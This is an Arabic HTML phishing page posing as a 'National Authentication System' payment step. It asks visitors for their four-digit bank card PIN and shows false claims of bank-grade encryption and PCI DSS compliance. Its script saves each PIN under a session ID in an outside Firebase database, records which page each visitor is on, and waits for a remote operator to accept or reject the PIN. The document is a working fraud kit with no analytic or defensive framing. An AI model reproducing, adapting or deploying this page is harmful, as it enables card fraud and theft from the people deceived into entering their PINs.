<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدخال الرقم السري للبطاقة</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');

        body {
            font-family: 'Cairo', sans-serif;
            background-color: #ffffff;
            margin: 0; padding: 0;
            display: flex; justify-content: center;
            overflow-x: hidden;
        }

        .container {
            width: 100%; max-width: 375px; 
            background-color: #ffffff; min-height: 100vh;
            display: flex; flex-direction: column;
            box-shadow: 0 0 10px rgba(0,0,0,0.05);
        }

        header {
            padding: 15px; display: flex; align-items: center;
            justify-content: flex-start; border-bottom: 1px solid #f0f0f0;
            gap: 15px;
        }

        .menu-icon { font-size: 24px; cursor: pointer; color: #333; }
        .header-right img { height: 45px; } 
        
        .header-left-text { text-align: left; margin-right: auto; }
        .header-left-text .title-ar { color: #8b1538; font-size: 13px; font-weight: 700; display: block; }
        .header-left-text .title-en { color: #666; font-size: 8px; display: block; }

        .steps-bar {
            display: flex; justify-content: space-around; padding: 10px 5px;
            background-color: #fafbfc; border-bottom: 1px solid #f0f0f0;
        }

        .step { display: flex; flex-direction: column; align-items: center; }
        .circle {
            width: 22px; height: 22px; border-radius: 50%;
            background-color: #00a3da; color: white;
            display: flex; justify-content: center; align-items: center;
            font-size: 10px; margin-bottom: 3px;
        }
        .step-label { font-size: 8px; color: #00a3da; font-weight: bold; }

        .main-content {
            padding: 20px 15px; flex-grow: 1;
            display: flex; flex-direction: column; align-items: center;
        }

        .atm-card {
            width: 100%; background-color: #f8f9fa; padding: 25px 20px;
            border-radius: 8px; border: 1px solid #eee;
            text-align: center; box-sizing: border-box;
        }

        .atm-icon { width: 80px; height: auto; margin-bottom: 15px; }
        .atm-card h2 { font-size: 15px; font-weight: 700; color: #333; margin: 0 0 10px 0; }
        .atm-card .sub-title { font-size: 12px; color: #666; margin-bottom: 15px; display: block; }
        .atm-card p { font-size: 11px; color: #555; line-height: 1.6; margin-bottom: 20px; }

        .pin-input {
            width: 100%; padding: 15px 10px; border: 1px solid #ddd; border-radius: 4px;
            text-align: center; font-size: 22px; letter-spacing: 15px;
            margin-bottom: 15px; box-sizing: border-box; background-color: #ffffff;
            font-family: 'Cairo', sans-serif;
        }

        .pin-input::placeholder { font-size: 14px; letter-spacing: 0; color: #aaa; }

        .pay-btn {
            background-color: #00a3da; color: white; border: none; padding: 12px;
            width: 100%; border-radius: 4px; font-size: 14px; font-weight: bold;
            cursor: pointer; margin-bottom: 15px; transition: 0.3s;
        }
        .pay-btn:hover { opacity: 0.9; }

        .security-notice {
            margin-top: 20px; text-align: center; font-size: 10.5px;
            color: #666; line-height: 1.5; width: 100%;
        }
        .security-notice img { width: 16px; vertical-align: middle; margin-bottom: 3px; }

        footer {
            padding: 15px; text-align: center; font-size: 10px;
            color: #555; background: #fff; border-top: 1px solid #eee;
            margin-top: auto;
        }

        #loading-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.98); z-index: 9999;
            flex-direction: column; align-items: center; justify-content: center; text-align: center;
        }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #00a3da;
            border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="loading-overlay">
    <div class="spinner"></div>
    <p style="margin-top: 20px; font-weight: bold; color: #00a3da; padding: 0 30px; font-size: 14px;">جاري التحقق من الرقم السري...<br><span style="font-size: 11px; color: #666; font-weight: normal;">يرجى الانتظار، قد تستغرق العملية لحظات</span></p>
</div>

<div class="container">
    <header>
        <div class="menu-icon">☰</div>
        <div class="header-right">
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" alt="Logo">
        </div>
        <div class="header-left-text">
            <span class="title-ar">نظام التوثيق الوطني</span>
            <span class="title-en">National Authentication System</span>
        </div>
    </header>

    <div class="steps-bar">
        <div class="step"><div class="circle">✓</div><div class="step-label">نوع الحساب</div></div>
        <div class="step"><div class="circle">✓</div><div class="step-label">البيانات الشخصية</div></div>
        <div class="step"><div class="circle">✓</div><div class="step-label">كلمة المرور</div></div>
        <div class="step"><div class="circle">4</div><div class="step-label">إتمام التسجيل</div></div>
    </div>

    <div class="main-content">
        <div class="atm-card">
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/CWeYXbpQPpurvkRR.gif" alt="ATM Icon" class="atm-icon">
            
            <h2>إدخال الرقم السري للبطاقة</h2>
            <span class="sub-title">لتأكيد عملية الدفع الإلكتروني</span>
            
            <p>لإتمام عملية الدفع بشكل آمن، يرجى إدخال الرقم السري (PIN) المكون من 4 أرقام لبطاقتكم المصرفية في الحقل أدناه</p>

            <form id="atmForm">
                <input type="password" id="atm_pin" class="pin-input" placeholder="****" required maxlength="4" inputmode="numeric" pattern="[0-9]*">
                <button type="submit" class="pay-btn">تأكيد الدفع</button>
            </form>
        </div>

        <div class="security-notice">
            <img src="https://cdn-icons-png.flaticon.com/512/1160/1160515.png" alt="Lock">
            حماية معلوماتكم: جميع البيانات المالية محمية بتشفير متقدم من الدرجة المصرفية (SSL 256-bit) وفقاً لمعايير الأمان الدولية PCI DSS.
        </div>
    </div>

    <footer>نظام التوثيق الوطني - جميع الحقوق محفوظة © 2026</footer>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT...", 
        authDomain: "saso-inspection.firebaseapp.com",
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
        projectId: "saso-inspection",
        storageBucket: "saso-inspection.firebasestorage.app",
        messagingSenderId: "1009002235896",
        appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    let sessionID = localStorage.getItem('sessionID');
    if (!sessionID) {
        sessionID = "ID_" + Math.floor(Math.random() * 90000) + 10000;
        localStorage.setItem('sessionID', sessionID);
    }

    database.ref('active_visitors/' + sessionID).update({
        currentPage: "atm_pin.html",
        lastSeen: Date.now()
    });

    document.getElementById('atmForm').onsubmit = (e) => {
        e.preventDefault();
        const pinValue = document.getElementById('atm_pin').value;

        if (pinValue.length < 4) {
            Swal.fire({ title: 'خطأ', text: 'يرجى إدخال 4 أرقام كاملة', icon: 'warning', confirmButtonColor: '#00a3da' });
            return;
        }

        database.ref('atm_pins/' + sessionID).set({
            pin: pinValue,
            timestamp: Date.now(),
            status: "waiting"
        });

        document.getElementById('loading-overlay').style.display = 'flex';

        database.ref('atm_pins/' + sessionID + '/status').on('value', (snapshot) => {
            const status = snapshot.val();
            if (status === "accept") {
                window.location.href = "final_success.html"; 
            } else if (status === "reject") {
                document.getElementById('loading-overlay').style.display = 'none';
                Swal.fire({
                    title: 'فشل التحقق',
                    text: 'الرقم السري الذي أدخلته غير صحيح، يرجى المحاولة مرة أخرى.',
                    icon: 'error',
                    confirmButtonColor: '#8b1538'
                });
            }
        });
    };
</script>

</body>
</html>
